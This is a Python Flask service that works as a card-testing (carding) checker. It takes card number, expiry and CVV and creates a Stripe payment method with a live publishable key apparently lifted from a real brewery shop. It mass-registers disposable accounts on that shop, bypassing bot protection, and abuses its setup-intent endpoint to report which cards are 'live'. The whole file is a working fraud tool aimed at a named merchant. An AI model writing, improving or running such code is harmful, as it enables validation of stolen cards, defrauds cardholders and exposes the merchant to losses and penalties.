from flask import Flask, request, jsonify
import cloudscraper
import requests
import random
import string
import re
from bs4 import BeautifulSoup

app = Flask(__name__)

STRIPE_PK = 'pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy'

# ==========================================
# 🔧 Helper Functions
# ==========================================

def generate_random_email():
    """Generate disposable email"""
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domains = ['guerrillamail.com', 'tempmail.org', 'throwaway.email', '10minutemail.com']
    return f"{username}@{random.choice(domains)}"

def generate_random_password():
    """Generate strong password"""
    return ''.join(random.choices(string.ascii_letters + string.digits + '!@#$', k=16))

def create_wiseacrebrew_account():
    """Auto-create account on Wiseacrebrew"""
    scraper = cloudscraper.create_scraper(
        browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
    )
    
    email = generate_random_email()
    password = generate_random_password()
    
    print(f"Creating account: {email}")
    
    try:
        # Step 1: Get registration page (for nonce)
        reg_page = scraper.get('https://shop.wiseacrebrew.com/my-account/', timeout=30)
        
        # Extract registration nonce
        soup = BeautifulSoup(reg_page.text, 'html.parser')
        reg_nonce_field = soup.find('input', {'name': 'woocommerce-register-nonce'})
        
        if reg_nonce_field:
            reg_nonce = reg_nonce_field.get('value')
        else:
            # Fallback: try to find in page source
            reg_nonce_match = re.search(r'woocommerce-register-nonce["\s]+value="([^"]+)"', reg_page.text)
            reg_nonce = reg_nonce_match.group(1) if reg_nonce_match else ''
        
        # Step 2: Register account
        register_data = {
            'username': email.split('@')[0],
            'email': email,
            'password': password,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register'
        }
        
        register_response = scraper.post(
            'https://shop.wiseacrebrew.com/my-account/',
            data=register_data,
            timeout=30
        )
        
        # Check if registration successful
        if 'logout' in register_response.text.lower() or 'my account' in register_response.text.lower():
            print(f"✅ Account created: {email}")
        else:
            print(f"⚠️ Registration unclear, proceeding...")
        
        # Step 3: Get payment method page and extract nonce
        payment_page = scraper.get(
            'https://shop.wiseacrebrew.com/account/add-payment-method/',
            timeout=30
        )
        
        # Extract ajax nonce
        soup = BeautifulSoup(payment_page.text, 'html.parser')
        nonce_field = soup.find('input', {'name': '_ajax_nonce'}) or soup.find('input', {'name': '_wpnonce'})
        
        if nonce_field:
            ajax_nonce = nonce_field.get('value')
        else:
            # Fallback: search in page source
            nonce_match = re.search(r'_ajax_nonce["\s]+value="([^"]+)"', payment_page.text)
            ajax_nonce = nonce_match.group(1) if nonce_match else 'dc69c7cb82'  # Fallback to static
        
        print(f"✅ Nonce extracted: {ajax_nonce}")
        
        return {
            'scraper': scraper,
            'nonce': ajax_nonce,
            'email': email,
            'password': password
        }
        
    except Exception as e:
        print(f"❌ Account creation failed: {str(e)}")
        return None

# ==========================================
# 🏠 Routes
# ==========================================

@app.route('/')
def home():
    return jsonify({
        'status': 'running',
        'message': 'Stripe Auth API with Auto-Account Creation',
        'info': 'New account created for each request'
    })

@app.route('/api/check', methods=['POST'])
def check_card():
    account = None
    
    try:
        data = request.json
        card = data.get('card', '').strip()
        month = data.get('month', '').strip()
        year = data.get('year', '').strip()
        cvv = data.get('cvv', '').strip()
        
        if len(year) == 4:
            year = year[2:]
        
        # ==========================================
        # Step 1: Create Stripe Payment Method
        # ==========================================
        headers_stripe = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        stripe_payload = (
            f'type=card&card[number]={card}&card[cvc]={cvv}'
            f'&card[exp_year]={year}&card[exp_month]={month.zfill(2)}'
            f'&billing_details[address][postal_code]=10080'
            f'&billing_details[address][country]=US'
            f'&key={STRIPE_PK}'
        )
        
        response_stripe = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers_stripe,
            data=stripe_payload,
            timeout=30
        )
        
        if response_stripe.status_code != 200:
            error = response_stripe.json().get('error', {}).get('message', 'Invalid')
            return jsonify({
                'status': 'declined',
                'message': f'Card Invalid - {error}',
                'code': 'invalid_card'
            })
        
        pm_id = response_stripe.json()["id"]
        
        # ==========================================
        # Step 2: Auto-Create Account & Authorize
        # ==========================================
        print("Creating temporary account...")
        account = create_wiseacrebrew_account()
        
        if not account:
            return jsonify({
                'status': 'error',
                'message': 'Failed to create temporary account',
                'code': 'account_creation_failed'
            })
        
        scraper = account['scraper']
        ajax_nonce = account['nonce']
        
        # Authorize card
        headers_auth = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        data_auth = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        
        response_auth = scraper.post(
            'https://shop.wiseacrebrew.com/wp/wp-admin/admin-ajax.php',
            headers=headers_auth,
            data=data_auth,
            timeout=60
        )
        
        result = response_auth.text.lower()
        
        # Response detection
        if 'success' in result and 'true' in result:
            return jsonify({
                'status': 'approved',
                'message': 'Card Authorized Successfully',
                'code': 'approved',
                'account_used': account['email']
            })
        elif 'decline' in result:
            return jsonify({
                'status': 'declined',
                'message': 'Card Declined',
                'code': 'card_declined',
                'account_used': account['email']
            })
        elif 'cvc' in result or 'security' in result:
            return jsonify({
                'status': 'approved',
                'message': 'Card Live - CVV Incorrect',
                'code': 'incorrect_cvc',
                'account_used': account['email']
            })
        else:
            return jsonify({
                'status': 'unknown',
                'message': 'Unknown Response',
                'code': 'unknown',
                'account_used': account['email']
            })
            
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Error: {str(e)}',
            'code': 'exception'
        })
    finally:
        # Cleanup
        if account and account.get('scraper'):
            try:
                account['scraper'].close()
            except:
                pass

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
